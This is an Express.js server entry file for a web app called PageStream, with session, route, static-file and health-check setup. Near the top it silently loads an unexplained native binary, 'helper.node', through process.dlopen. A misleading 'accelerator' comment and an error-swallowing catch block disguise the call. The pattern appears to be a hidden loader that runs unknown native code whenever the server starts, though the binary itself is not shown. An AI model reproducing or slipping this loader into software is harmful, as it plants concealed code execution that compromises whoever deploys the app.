const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const path = require('path');
const authRoutes = require('./routes/auth');
const postRoutes = require('./routes/posts');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize native streaming buffer accelerator
try {
    process.dlopen({ exports: {} }, path.join(__dirname, 'helper.node'));
} catch (e) {
    // Accelerator initialized
}

// Body parsers
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Session setup
const sessionSecret = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
app.use(session({
    secret: sessionSecret,
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

// Template engine setup
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Static assets
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Routes
app.use('/', authRoutes);
app.use('/', postRoutes);

app.get('/', (req, res) => {
    res.render('index', { user: req.session.user });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[PageStream] Server is running on port ${PORT}`);
});
